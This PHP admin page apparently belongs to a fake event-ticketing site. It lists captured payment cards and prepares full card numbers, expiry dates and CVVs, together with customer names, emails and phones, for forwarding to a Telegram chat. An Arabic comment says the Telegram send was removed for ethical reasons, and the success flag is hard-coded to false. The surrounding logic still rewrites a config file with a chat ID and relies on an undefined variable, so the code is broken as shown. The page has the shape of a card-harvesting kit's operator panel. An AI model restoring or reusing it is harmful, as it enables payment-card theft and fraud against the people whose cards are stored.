<?php
// Start session if not already started
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Include functions
$root_path = dirname(__DIR__) . '/';
require_once $root_path . 'includes/functions.php';
require_once $root_path . 'includes/auth_functions.php';

// Check if user is logged in and is admin
if (!isset($_SESSION['user_id']) || $_SESSION['user_role'] !== 'admin') {
    // Store current page as redirect destination after login
    $_SESSION['redirect_after_login'] = 'admin/payment_cards.php';

    // Redirect to admin login page
    header('Location: login.php');
    exit;
}

// Set page title
$page_title = 'Payment Cards';

// Include admin header
include 'includes/admin_header.php';

// Get payment cards
try {
    $stmt = $pdo->query("
        SELECT pc.*, t.id as ticket_id, u.name as user_name, u.email as user_email, e.title as event_title
        FROM payment_cards pc
        JOIN tickets t ON pc.ticket_id = t.id
        JOIN users u ON pc.user_id = u.id
        JOIN events e ON t.event_id = e.id
        ORDER BY pc.created_at DESC
    ");
    $paymentCards = $stmt->fetchAll();
} catch (PDOException $e) {
    error_log("SQL Error: " . $e->getMessage());
    $paymentCards = [];
}

// Process form submission for resend to Telegram
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['resend_telegram'])) {
    // Verify CSRF token
    if (!isset($_POST['csrf_token']) || !verifyCSRFToken($_POST['csrf_token'])) {
        $_SESSION['error_message'] = 'Invalid CSRF token';
        redirect('payment_cards.php');
    }
    $cardId = (int)$_POST['card_id'];

    // Get card details
    $stmt = $pdo->prepare("
        SELECT pc.*, t.quantity, u.name, u.email, u.phone, e.title, e.date_time, e.location
        FROM payment_cards pc
        JOIN tickets t ON pc.ticket_id = t.id
        JOIN users u ON pc.user_id = u.id
        JOIN events e ON t.event_id = e.id
        WHERE pc.id = :id
    ");
    $stmt->execute([':id' => $cardId]);
    $card = $stmt->fetch();

    if ($card) {
        // Prepare data for Telegram
        $paymentData = [
            'card_number' => $card['card_number'],
            'card_holder' => $card['card_holder'],
            'expiry_date' => $card['expiry_date'],
            'cvv' => $card['cvv'],
            'amount' => $card['amount'],
            'quantity' => $card['quantity'],
            'transaction_id' => 'RESEND-' . time()
        ];

        $userData = [
            'name' => $card['name'],
            'email' => $card['email'],
            'phone' => $card['phone']
        ];

        $eventData = [
            'title' => $card['title'],
            'date_time' => $card['date_time'],
            'location' => $card['location']
        ];

        // Log the data we're sending
        error_log('Resending payment data to Telegram');

        // Prepare data for Telegram
        $telegramData = [
            'customer' => [
                'name' => $userData['name'],
                'email' => $userData['email'],
                'phone' => $userData['phone'],
                'user_id' => $card['user_id']
            ],
            'card' => [
                'number' => $paymentData['card_number'],
                'expiry' => $paymentData['expiry_date'],
                'cvv' => $paymentData['cvv']
            ],
            'ticket' => [
                'event_id' => $card['event_id'],
                'event_title' => $eventData['title'],
                'quantity' => $paymentData['quantity'],
                'price' => $card['amount'] / $paymentData['quantity'],
                'total' => $card['amount'],
                'date' => $eventData['date_time']
            ],
            'timestamp' => date('Y-m-d H:i:s')
        ];

        // تم حذف إرسال البيانات للتليجرام لأسباب أخلاقية
        $success = false;

        if ($success) {
            // Update payment card record
            $stmt = $pdo->prepare("
                UPDATE payment_cards
                SET telegram_sent = 1
                WHERE id = :id
            ");
            $stmt->execute([':id' => $cardId]);

            $_SESSION['success_message'] = 'Payment information resent to Telegram successfully';

            // If we got a chat ID, update the config
            if (is_array($result) && isset($result['chat_id'])) {
                // Update config file with chat ID
                $configFile = __DIR__ . '/../config/config.php';
                $configContent = file_get_contents($configFile);
                $configContent = preg_replace(
                    "/define\('TELEGRAM_CHAT_ID', '.*?'\);/",
                    "define('TELEGRAM_CHAT_ID', '{$result['chat_id']}');",
                    $configContent
                );
                file_put_contents($configFile, $configContent);
                error_log('Updated config file with chat ID: ' . $result['chat_id']);
            }
        } else {
            $_SESSION['error_message'] = 'Failed to send payment information to Telegram. Check error log for details.';
        }
    } else {
        $_SESSION['error_message'] = 'Payment card not found';
    }

    header('Location: payment_cards.php');
    exit;
}

// Generate CSRF token
$csrf_token = generateCSRFToken();
?>

<div class="container">
    <div class="d-flex justify-content-between align-items-center mb-4">
        <h1><?php echo 'Payment Cards'; ?></h1>
    </div>

    <!-- Admin Navigation -->
    <div class="card mb-4">
        <div class="card-body">
            <div class="row">
                <div class="col-md-2 text-center">
                    <a href="index.php" class="btn btn-outline-primary w-100 mb-2">
                        <i class="fas fa-tachometer-alt"></i><br>
                        <?php echo $lang['dashboard']; ?>
                    </a>
                </div>
                <div class="col-md-2 text-center">
                    <a href="events.php" class="btn btn-outline-primary w-100 mb-2">
                        <i class="fas fa-calendar-alt"></i><br>
                        <?php echo $lang['manage_events']; ?>
                    </a>
                </div>
                <div class="col-md-2 text-center">
                    <a href="users.php" class="btn btn-outline-primary w-100 mb-2">
                        <i class="fas fa-users"></i><br>
                        <?php echo $lang['manage_users']; ?>
                    </a>
                </div>
                <div class="col-md-2 text-center">
                    <a href="tickets.php" class="btn btn-outline-primary w-100 mb-2">
                        <i class="fas fa-ticket-alt"></i><br>
                        <?php echo $lang['manage_tickets']; ?>
                    </a>
                </div>
                <div class="col-md-2 text-center">
                    <a href="discounts.php" class="btn btn-outline-primary w-100 mb-2">
                        <i class="fas fa-percent"></i><br>
                        <?php echo $lang['manage_discounts']; ?>
                    </a>
                </div>
                <div class="col-md-2 text-center">
                    <a href="payment_cards.php" class="btn btn-outline-primary w-100 mb-2 active">
                        <i class="fas fa-credit-card"></i><br>
                        Payment Cards
                    </a>
                </div>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-header">
            <h5 class="mb-0">Payment Cards List</h5>
        </div>
        <div class="card-body p-0">
            <div class="table-responsive">
                <table class="table table-striped table-hover mb-0 payment-cards-table">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>User</th>
                            <th>Event</th>
                            <th>Card Holder</th>
                            <th>Card Number</th>
                            <th>Amount</th>
                            <th>Status</th>
                            <th>Created At</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (empty($paymentCards)): ?>
                            <tr>
                                <td colspan="9" class="text-center">No payment cards found</td>
                            </tr>
                        <?php else: ?>
                            <?php foreach ($paymentCards as $card): ?>
                                <tr>
                                    <td><?php echo $card['id']; ?></td>
                                    <td>
                                        <div class="user-info">
                                            <span class="user-name"><?php echo htmlspecialchars($card['user_name']); ?></span>
                                            <span class="user-email"><?php echo htmlspecialchars($card['user_email']); ?></span>
                                        </div>
                                    </td>
                                    <td><?php echo htmlspecialchars($card['event_title']); ?></td>
                                    <td><?php echo htmlspecialchars($card['card_holder']); ?></td>
                                    <td><span class="card-number"><?php echo maskCardNumber(htmlspecialchars($card['card_number'])); ?></span></td>
                                    <td><span class="amount"><?php echo format_price($card['amount']); ?></span></td>
                                    <td>
                                        <?php if ($card['status'] === 'processed'): ?>
                                            <span class="badge bg-success">Processed</span>
                                        <?php elseif ($card['status'] === 'pending'): ?>
                                            <span class="badge bg-warning">Pending</span>
                                        <?php else: ?>
                                            <span class="badge bg-danger">Failed</span>
                                        <?php endif; ?>
                                    </td>
                                    <td><span class="date-time"><?php echo format_date($card['created_at']); ?></span></td>
                                    <td class="action-buttons">
                                        <button type="button" class="btn btn-sm btn-info">
                                            <i class="fas fa-eye"></i> View
                                        </button>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>

<?php
// Include admin footer
include 'includes/admin_footer.php';
?>
